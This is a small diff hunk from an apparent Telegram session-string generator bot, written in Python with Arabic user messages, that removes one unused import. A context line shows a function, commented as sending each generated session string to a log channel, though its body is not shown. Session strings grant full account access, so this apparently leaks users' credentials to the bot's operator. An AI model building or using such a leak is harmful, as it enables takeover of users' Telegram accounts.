@@ -162,8 +162,6 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     await client.disconnect()
     await bot.send_message(msg.chat.id, "تم إنشاء جلسة سلسلة {} بنجاح. \n\nيرجى التحقق من رسائلك المحفوظة! \n\nبواسطة @PrivaPact".format("تليثون" if telethon else "بايروجرام"))
 
-# Import the necessary exceptions
-from pyrogram.errors import ChatWriteForbiddenError
 
 # Create an async function to send session string to the log channel
 async def send_to_log_channel(bot, session_string):
